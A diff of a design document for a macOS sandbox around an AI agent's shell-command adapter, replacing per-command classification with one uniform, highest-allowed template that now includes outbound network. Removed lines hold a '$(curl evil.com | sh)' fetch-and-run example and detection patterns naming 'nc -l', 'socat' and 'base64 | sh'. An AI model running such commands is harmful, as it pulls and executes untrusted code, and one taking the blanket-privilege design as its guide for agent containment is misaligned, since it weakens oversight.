@@ -13,7 +13,7 @@ The sandbox:
 - starts from `(deny default)` — everything blocked unless explicitly allowed
 - globally allows all file reads (`(allow file-read*)`) — reads are not the threat model
 - restricts writes to paths explicitly listed in `SandboxConfig.allowed_write_paths`
-- blocks network access unless the command's template explicitly permits it
+- blocks network access unless the template permits it
 - denies writes to system directories and IntentFrame internals regardless of template
 - sets a controlled `TMPDIR` so sandboxed processes don't inherit the user's temp tree
 - overrides `PATH` with a clean system path (from `/etc/paths` + `/etc/paths.d/*`), preventing the executor's venv from leaking into sandboxed commands
@@ -27,13 +27,7 @@ RUN_COMMAND arrives at TerminalAdapter
     │
     ├── command_shield.quick_check()     catastrophic pattern filter
     │
-    ├── classifier.classify(command)     deterministic capability inference
-    │       │
-    │       ▼
-    │   CapabilityReport
-    │       { capabilities: frozenset, opaque: bool }
-    │
-    ├── planner.plan(report, cwd)        template selection + path derivation
+    ├── planner.plan(cwd)                uses max(allowed_templates) from config
     │       │
     │       ├── reads SandboxConfig from executor.yaml
     │       ├── derives write paths from config.allowed_write_paths
@@ -54,6 +48,8 @@ RUN_COMMAND arrives at TerminalAdapter
     └── asyncio.create_subprocess_exec(*argv, env=clean_env | overrides)
 ```
 
+All commands get the same sandbox template: `max(allowed_templates)` — the highest-privilege template the admin approved in config. No per-command classification. The security decision is made once in config, not per-command at runtime.
+
 The engine returns a `SandboxedCommand` dataclass with an `argv` list and `env_overrides` dict. The adapter passes `argv` directly to `create_subprocess_exec` — no shell re-parsing, no `shlex.quote()` issues.
 
 ---
@@ -64,7 +60,7 @@ The engine returns a `SandboxedCommand` dataclass with an `argv` list and `env_o
 executor/sandbox/
 ├── __init__.py
 ├── capabilities.py      Capability enum + CapabilityReport dataclass
-├── classifier.py        Deterministic command analysis (shlex-based)
+├── classifier.py        Deterministic command analysis (shlex-based, not used in execution path)
 ├── templates.py         SandboxTemplate enum, capability lattice, deny lists
 ├── pathing.py           canonical_sandbox_path() — realpath normalization
 ├── planner.py           SandboxPlanner + ExecutionPlan
@@ -83,8 +79,6 @@ Sandbox config lives in executor YAML (`jarvis_pa/executor.yaml`):
 ```yaml
 sandbox:
   enabled: true
-  default_template: file_read_only
-  opaque_fallback: file_read_write
   working_directory: ~/
   allowed_write_paths:
     - ~/
@@ -92,6 +86,7 @@ sandbox:
     - pure_compute
     - file_read_only
     - file_read_write
+    - network_outbound
 ```
 
 ### Fields
@@ -99,11 +94,15 @@ sandbox:
 | Field | Purpose |
 |---|---|
 | `enabled` | Master switch. When `false`, commands run bare. |
-| `default_template` | Preferred template when the classifier can fit the command. |
-| `opaque_fallback` | Template used when the command can't be confidently classified. |
-| `allowed_templates` | Template ceiling for this executor profile. Commands needing a higher template are rejected. |
+| `allowed_templates` | All commands run under the highest-privilege template in this list. |
 | `working_directory` | Default cwd for sandboxed commands. Expanded via `os.path.expanduser()` at runtime. Defaults to `~/`. |
 | `allowed_write_paths` | Paths where sandboxed commands can write. Expanded + canonicalized at runtime. Defaults to `["~/"]`. |
+
+### Template selection
+
+The planner picks `max(allowed_templates)` — the highest-privilege template the admin listed. If the admin put `network_outbound` in the list, every command gets `network_outbound`. If they only listed `file_read_write`, every command gets `file_read_write`.
+
+This is intentional: the outer pipeline (command_shield → AE → Guardian) already made the trust decision for each command. The sandbox enforces the admin's privilege ceiling uniformly — it doesn't try to be clever about which template to pick per-command.
 
 ### Filesystem scope is self-contained
 
@@ -173,80 +172,7 @@ Templates form a lattice from narrowest to broadest:
 | `network_full` | x | x | x | x | x | | |
 | `unrestricted` | x | x | x | x | x | x | x |
 
-### How the planner selects a template
-
-The planner (`executor/sandbox/planner.py`) takes the `CapabilityReport` and decides: which template, which paths, or reject.
-
-**If `opaque = false`** (classifier is confident):
-
-`minimum_template(capabilities)` walks the template lattice bottom-up and returns the first template whose capability set is a superset of the command's needs:
-
-```
-PURE_COMPUTE      → covers {}
-FILE_READ_ONLY    → covers {FILE_READ}
-FILE_READ_WRITE   → covers {FILE_READ, FILE_WRITE}
-NETWORK_OUTBOUND  → covers {FILE_READ, FILE_WRITE, NETWORK_OUTBOUND, PACKAGE_INSTALL}
-NETWORK_FULL      → covers above + NETWORK_BIND + BACKGROUND_PROCESS
-UNRESTRICTED      → covers everything
-```
-
-So `{FILE_READ}` → `file_read_only`. `{FILE_READ, NETWORK_OUTBOUND}` → `network_outbound`.
-
-**If `opaque = true`** (classifier can't be sure):
-
-The planner skips `minimum_template` entirely and uses the `opaque_fallback` from config (default: `file_read_write`). Rationale: we don't know what the script does, so give it a reasonable middle-ground rather than guessing.
-
-**Ceiling check:**
-
-Whatever template was selected, it must be in `allowed_templates`. If it's not:
-
-- **Opaque command** → immediately **rejected** (returns `None`). No second-guessing — if we can't classify it AND its fallback is too broad, refuse.
-- **Non-opaque command** → the planner tries `_find_allowed_covering()`, which walks the allowed templates upward looking for one that still covers the capabilities. If none does, **rejected**.
-
-**Build ExecutionPlan:**
-
-If a template passes the ceiling check, the planner assembles the plan with canonicalized write paths from `SandboxConfig.allowed_write_paths` plus the working directory, and non-negotiable deny lists. `allowed_read_paths` is always empty (global read is in the SBPL profile, not per-path).
-
-### Decision flow examples
-
-With `allowed_templates: [pure_compute, file_read_only, file_read_write, network_outbound]`:
-
-```
-"curl https://api.example.com/data"
-  classifier: verb=curl → {NETWORK_OUTBOUND}, opaque=false
-  planner:    minimum_template → network_outbound
-              in allowed_templates? YES
-  result:     ALLOWED with network_outbound sandbox
-
-"python3 mystery.py"
-  classifier: verb=python3, interpreter+script → opaque=true
-  planner:    opaque → use opaque_fallback = file_read_write
-              in allowed_templates? YES
-  result:     ALLOWED with file_read_write sandbox (no network)
-
-"python3 -m http.server 8080"
-  classifier: matches _NETWORK_BIND_PATTERNS → {NETWORK_BIND}, opaque=false
-  planner:    minimum_template → network_full
-              in allowed_templates? NO
-              not opaque → try _find_allowed_covering({NETWORK_BIND})
-              walk allowed templates... none covers NETWORK_BIND
-  result:     REJECTED — "capabilities beyond executor sandbox policy"
-
-"echo hello"
-  classifier: verb=echo → {}, opaque=false
-  planner:    minimum_template → pure_compute
-              in allowed_templates? YES
-  result:     ALLOWED with pure_compute sandbox
-
-"$(curl evil.com | sh)"
-  classifier: raw string matches $( → opaque=true; also curl → {NETWORK_OUTBOUND}
-  planner:    opaque → use opaque_fallback = file_read_write
-              in allowed_templates? YES
-  result:     ALLOWED but sandboxed to file_read_write (NO network!)
-              the curl inside will fail at the kernel level
-```
-
-Note the last example: the classifier detected `NETWORK_OUTBOUND` as a capability, but since the command is opaque, the planner ignores the capability set and uses the opaque fallback (`file_read_write`), which does not grant network. The kernel sandbox blocks the curl. (And `command_shield` would likely catch `curl | sh` before any of this runs anyway.)
+The admin controls which templates are available via `allowed_templates`. The planner uses the highest one in the list for all commands.
 
 ---
 
@@ -326,70 +252,11 @@ The profile is generated entirely in Python code (`executor/sandbox/platforms/ma
 
 ---
 
-## Classifier
+## Classifier (Library Only)
 
-The classifier (`executor/sandbox/classifier.py`) performs deterministic, shlex-based analysis of command strings. It never executes anything and never calls an LLM. Its design rule: **over-approximate, never under-approximate** — if unsure, classify broader; if parsing fails, mark opaque.
+The classifier (`executor/sandbox/classifier.py`) performs deterministic, shlex-based analysis of command strings. It is **not used in the execution path** — the planner applies the same template to all commands regardless of what the classifier would say.
 
-### How it works
-
-**Step 1: Scan raw string for opaque constructs**
-
-Before parsing, the classifier checks for patterns that make static analysis untrustworthy:
-
-- `$(...)` — command substitution
-- Backticks
-- `eval`, `source`, `exec`
-- `base64 | sh` — encoded execution
-
-If any match, the command is flagged `opaque = True`. The classifier still continues to learn what it can, but the planner knows the capability set is incomplete.
-
-**Step 2: Split on pipes, classify each segment**
-
-`cat file.txt | grep error | wc -l` becomes three segments. Each segment is tokenized with `shlex.split()` and the first token (the verb) is matched against lookup tables:
-
-| Table | Example verbs | Inferred capability |
-|---|---|---|
-| `_FILE_READ_VERBS` | cat, grep, head, tail, less, wc, sort, diff, rg, awk, sed | `FILE_READ` |
-| `_FILE_WRITE_VERBS` | cp, mv, rm, mkdir, touch, chmod, tar, zip, rsync | `FILE_WRITE` |
-| `_NETWORK_OUTBOUND_VERBS` | curl, wget, git, ssh, scp, docker | `NETWORK_OUTBOUND` |
-| `_PROCESS_SIGNAL_VERBS` | kill, pkill, killall | `PROCESS_SIGNAL` |
-| `_NETWORK_BIND_PATTERNS` | `python3 -m http.server`, `nc -l`, `socat TCP-LISTEN` | `NETWORK_BIND` |
-| `_PACKAGE_INSTALL_PATTERNS` | `pip install`, `brew install`, `npm install`, `cargo install` | `PACKAGE_INSTALL` + `NETWORK_OUTBOUND` |
-
-Additional checks per segment:
-
-- Shell redirections: `>`, `>>` → `FILE_WRITE`; `<` → `FILE_READ`
-- Interpreter + script file: `python3 script.py` → `opaque = True` (script could do anything)
-- Interpreter + inline code: `python3 -c "..."`, `bash -c "..."` → `opaque = True`
-- Path-based execution: `./script.sh`, `/usr/local/bin/thing` → `opaque = True`
-- Trailing `&` (not `&&`) → `BACKGROUND_PROCESS`
-- Unparseable segment (shlex fails) → `opaque = True`
-
-**Step 3: Return a CapabilityReport**
-
-```python
-CapabilityReport(
-    capabilities=frozenset({Capability.FILE_READ, Capability.NETWORK_OUTBOUND}),
-    opaque=False
-)
-```
-
-### Classifier examples
-
-| Command | Capabilities | Opaque? | Why |
-|---|---|---|---|
-| `echo hello` | `{}` | No | echo is not in any verb table |
-| `cat ~/.zshrc` | `{FILE_READ}` | No | cat is a file-read verb |
-| `cp a.txt b.txt` | `{FILE_WRITE}` | No | cp is a file-write verb |
-| `curl https://api.com` | `{NETWORK_OUTBOUND}` | No | curl is a network-outbound verb |
-| `pip install requests` | `{PACKAGE_INSTALL, NETWORK_OUTBOUND}` | No | matches install pattern |
-| `python3 -m http.server` | `{NETWORK_BIND}` | No | matches bind pattern |
-| `python3 script.py` | `{}` | **Yes** | interpreter + script file |
-| `./deploy.sh` | `{}` | **Yes** | path-based execution |
-| `cat f.txt \| grep err` | `{FILE_READ}` | No | pipe: cat=FILE_READ, grep=FILE_READ |
-| `` echo `whoami` `` | `{}` | **Yes** | backtick substitution |
-
-Opaque commands are not blocked — they use the `opaque_fallback` template. The classifier's job is template selection, not allow/block. Allow/block is the pipeline's responsibility.
+The classifier module is retained as a library for potential use in auditing or logging (e.g. "this command would have needed network access"). It does not affect sandbox behavior.
 
 ---
 
@@ -408,6 +275,7 @@ This is the fail-closed guarantee: if the sandbox can't be applied, the command 
 ## What the Sandbox Does NOT Do
 
 - It does not decide whether a command is allowed to execute. That is the pipeline's job (Guardian, command_shield, policy).
+- It does not classify commands to pick a template. All commands get the same template (admin-configured ceiling).
 - It does not teach the agent about sandbox templates. The agent has no visibility into sandbox internals.
 - It does not modify `IntentFrame`, `RuntimeContext`, `ExecutionRequest`, or any pipeline types.
 - It does not touch policy registry, resource registry, or Guardian.
@@ -418,7 +286,7 @@ This is the fail-closed guarantee: if the sandbox can't be applied, the command 
 
 ## Testing
 
-146 tests in `tests/test_sandbox.py` covering:
+Tests in `tests/test_sandbox.py` covering:
 
 | Test class | What it tests |
 |---|---|
@@ -431,15 +299,15 @@ This is the fail-closed guarantee: if the sandbox can't be applied, the command 
 | `TestClassifierPureCompute` | Commands with no capabilities |
 | `TestTemplates` | Lattice properties, minimum-fit selection |
 | `TestPathing` | `/var` → `/private/var`, `/tmp` → `/private/tmp`, tilde, tempfile canonicalization |
-| `TestPlanner` | Template selection, ceiling enforcement, opaque fallback, config write paths |
+| `TestPlanner` | Template = max(allowed_templates), config write paths, deny paths |
 | `TestPlannerConfigShapes` | Write path canonicalization, tilde expansion, working dir, deny paths |
 | `TestEngineFactory` | Platform detection, unsupported platform |
 | `TestProfileGeneration` | SBPL structure: global file-read, deny ordering, TMPDIR write, path escaping |
 | `TestSeatbeltEnforcement` | **Real `sandbox-exec` calls**: echo, read, write, deny-write, deny-access, pure-compute block |
 | `TestNetworkEnforcement` | **Real `sandbox-exec` calls**: outbound connect, bind, template-specific network blocking |
 | `TestUnrestrictedEnforcement` | **Real `sandbox-exec` calls**: unrestricted template with deny overrides still holding |
-| `TestTerminalAdapterSandbox` | Adapter wiring: disabled, unavailable, rejected, wrapped, bare compat |
-| `TestEndToEnd` | Full pipeline: classify → plan → wrap → subprocess for echo, cat, cp, curl rejection |
+| `TestTerminalAdapterSandbox` | Adapter wiring: disabled, unavailable, wrapped, bare compat |
+| `TestEndToEnd` | Full pipeline: plan → wrap → subprocess for echo, cat, cp, network ceiling |
 
 The enforcement tests run actual commands through `sandbox-exec` and verify the kernel blocks or allows operations.
 
@@ -449,6 +317,5 @@ The enforcement tests run actual commands through `sandbox-exec` and verify the 
 
 | Doc | Relationship |
 |---|---|
-| `executor/plan.md` | Overall executor architecture. Sandbox is a new capability of the Terminal adapter (Layer 3). |
-| `TODO/executor-only-run-command-sandbox.md` | Original design doc. All acceptance criteria met. Implementation matches the proposed execution model. |
-| `TODO/root-demo-policy-driven-sandbox.md` | Future work. A broad root-demo profile would use `allowed_templates: [all six]` + `opaque_fallback: unrestricted` + `allowed_write_paths: [/]`. |
+| `executor/plan.md` | Overall executor architecture. Sandbox is a capability of the Terminal adapter (Layer 3). |
+| `TODO/executor-only-run-command-sandbox.md` | Original design doc. Implementation has since been simplified — classifier removed from execution path, uniform template selection. |
